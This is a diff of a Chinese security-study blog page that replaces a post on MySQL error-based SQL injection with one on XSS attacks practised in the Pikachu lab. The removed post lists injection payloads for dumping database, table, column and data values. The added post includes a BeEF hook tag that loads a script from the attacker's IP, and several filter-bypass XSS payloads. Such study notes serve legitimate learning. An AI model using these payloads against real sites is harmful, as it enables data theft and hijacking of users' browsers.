@@ -185,78 +185,47 @@
     </div>
 
     <div class="content" v-pre>
-        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>  </p>
-<h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5  </p>
-<h6 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h6><blockquote>
-<p>函数原型：<code>extractvalue(xml_document,Xpath_string)    正常语法：</code>extractvalue(xml_document,Xpath_string);<br> 第一个参数：<code>xml_document</code>是string格式，为xml文档对象的名称<br> 第二个参数：<code>Xpath_string</code>是xpath格式的字符串<br> 作用：从目标xml中返回包含所查询值的字符串</p>
-</blockquote>
-<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
-<p>payload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p>
-<p>例如：</p>
-<pre><code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))
-id=&#39;and(select extractvalue(1,concat(0x7e,@@version)))
+        <h2 id="漏洞-XSS"><a href="#漏洞-XSS" class="headerlink" title="漏洞-XSS"></a>漏洞-XSS</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性<br>    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如一些留言板,评论<br>    3.DOM型XSS; &#x3D;&gt; 不与后端服务器产生数据交互,是一种通过DOM操作前端数据输出的时候产生的问题</p>
+<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>简单来讲就是在浏览器里面输入<code>&lt;script&gt;xxxx&lt;\script&gt;</code>脚本块,被当成js代码执行了</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/attachment/Pasted%20image%2020240224123110.png"><br>如图所示,输入的内容会显示在下面,如果在里面输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,那么就会执行alert(1)<br>假如此时输入框做了输入长度的限制,那么可以在url参数中写,绕过限制</p>
+<h4 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h4><p>浏览器的输入通过get传递给后端,再由后端传回来显示在浏览器上.<br>这时攻击者C启动beef-xss,先模拟用户登录网站,在输入框输入hook代码<code>&lt;script src=&quot;http://&lt;C的ip&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>,再到beef的webUI界面<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F,%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F,%E9%82%A3%E4%B9%88%E5%B0%B1%E6%8A%8A%E6%AD%A4%E6%97%B6%E7%9A%84url(%E6%90%BA%E5%B8%A6%E6%9C%89%E7%94%A8%E6%88%B7%E4%BB%A3%E7%A0%81)%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85,%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%E8%BF%9E%E6%8E%A5,%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B0%B1%E8%A2%AB%E5%8A%AB%E6%8C%81%E4%BA%86">http://127.0.0.1:3000/ui/panel检查是否成功,如果成功,那么就把此时的url(携带有用户代码)发送给受害者,受害者点击连接,浏览器的信息就被劫持了</a></p>
+<h4 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h4><p>浏览器的输入通过post传递给后端,输入的内容不会被显示在url中,此时可以抓包,在参数那里写<code>&lt;script&gt;xxxx&lt;\script&gt;</code>代码</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>这个就是你存进去之后别人访问到这个页面也会有这个效果</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。<br>例如</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;
+&lt;script&gt;
+function xsstest()
+&#123;
+    var str = document.getElementById(&quot;input&quot;).value;
+    document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src=&#39;&quot;+str+&quot;&#39;&gt;&lt;/img&gt;&quot;;
+&#125;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;
+&lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot; /&gt;
+&lt;input type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;xsstest()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
-<p>针对mysql数据库：</p>
-<pre><code>查数据库名：id=&#39;and(select extractvalue(1,concat(0x7e,(select database()))))
-爆表名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
-爆字段名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))
-爆数据：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
-</code></pre>
-<p>注：</p>
-<ul>
-<li>① 0x7e&#x3D;’~’</li>
-<li>② concat(‘a’,‘b’)&#x3D;“ab”</li>
-<li>③ version()&#x3D;@@version</li>
-<li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li>
-<li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li>
-</ul>
-<h6 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h6><blockquote>
-<p>函数原型：updatexml(xml_document,xpath_string,new_value)<br> 正常语法：updatexml(xml_document,xpath_string,new_value)<br> 第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br> 第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p>
-</blockquote>
-<p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(selectupdatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p>
-<p>例如：</p>
-<pre><code>&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))
-&#39;and(select updatexml(1,concat(0x7e,@@database),1))
-</code></pre>
-<p>同样，针对mysql：</p>
-<pre><code>爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))
-爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
-爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))
-爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
-</code></pre>
-<h3 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h3><p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<br><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p>
-<p><strong>rand()：</strong></p>
-<blockquote>
-<p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>
-</blockquote>
-<p><strong>floor()：</strong></p>
-<blockquote>
-<p>对任意正或者负的十进制值向下取整</p>
-</blockquote>
-<p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p>
-<p><strong>group by</strong></p>
-<blockquote>
-<p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br> SELECT column_name, aggregate_function(column_name)<br> FROM table_name<br> WHERE column_name operator value<br> GROUP BY column_name</p>
-</blockquote>
-<p>常见的payload为：</p>
-<pre><code>&#39;union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from &quot;一个足大的表&quot; group by x)a--+
-</code></pre>
-<p>例如：</p>
-<pre><code>&#39;union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a--+
-
-利用information_schema.tables表，相似的还可以用information_schema.columns等
-</code></pre>
-<p>为了使结构能够更方便的查看，可以在concat()中添加一些内容</p>
-<pre><code>&#39;union select 1 from (select count(*),concat((select user()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
-</code></pre>
-<p>之后还是将select语句改为一般的注入语句就可以：</p>
-<pre><code>爆数据库名：&#39;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
-爆表名：&#39;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
-爆列名：&#39;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
-爆数据：&#39;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
-</code></pre>
-<p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数</p>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><br><a target="_blank" rel="noopener" href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a><br><a target="_blank" rel="noopener" href="http://lawlietweb.com/2017/11/12/error-base/">http://lawlietweb.com/2017/11/12/error-base/</a></p>
+<p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p>
+<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>xss盲打并不是xss漏洞的一种类型，而是xss漏洞的一个应用场景，主要是针对网站的后台管理员。<br>打开pukachu的xss盲打在输入框累随意输入一些字符点击提交，我们可以发现输入的结果并没有显示在前端，而是直接提交到后端管理员页面。<br> 如果我们输入一段js代码，由于是直接提交到后端管理员页面，用户前端并不会执行。<br> <img src="/attachment/Pasted%20image%2020240308091004.png"><br><img src="/attachment/Pasted%20image%2020240308091013.png"><br>我们在输入框输入<code>&lt;script&gt;alert(&#39;6666&#39;)&lt;/script&gt;</code>,然后提交，再点右上角的提示登入pikachuxss盲打的管理员后台；<br>我们会发现弹出了弹窗，说明我们盲打成功；xss盲打其实是一种尝试性的攻击行为，因为攻击者并不知道后台有没有输出或者是过滤；<br>xss盲打本质还是存储型xss漏洞的利用只不是后台输出端由用户变成了网站管理员，但是危害性就更大了。</p>
+<h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><p>xss绕过-过滤-转换</p>
+<p>例子：<br>1.前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。所以安全措施尽量不要放在前端。<br>2.大小写，比如<code>&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;</code>。如果过滤措施只对小写做了处理，我们就可以通过大写的输入来绕过他的措施，大写的输入被输出前端时仍然会被正常的执行。<br>3.双写（拼凑），<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>。会去除敏感标签如<code>&lt;script&gt;</code>但可能只会去除一次<br>4.注释干扰，<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。在前端输出时注释是不会被执行的</code><br>xss绕过-过滤-编码</p>
+<p>后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤，当浏览器对该标签进行识别时，会翻译成正常的标签，从而执行。（ps：使用编码要注意编码在输出点是否会被正常识别和翻译）</p>
+<p>实验演示：</p>
+<p>打开pikachu的xss之过滤，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>点提交</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"></a></p>
+<p>没有弹窗弹出</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"></a></p>
+<p> 接着我们查看页面源码</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"></a></p>
+<p> 可以看到我们输入的标签都被去掉了，说明后台有对<code>&lt;script&gt;</code>标签进行过滤</p>
+<p>接下来我们使用大小写混合的方法输入<code>&lt;SCrIPT&gt;alert(1)&lt;/ScRiPt&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"></a></p>
+<p> 成功弹窗，说明我们成功绕过了过滤，他的过滤措施并没有对大小写过滤。</p>
 
     </div>
 
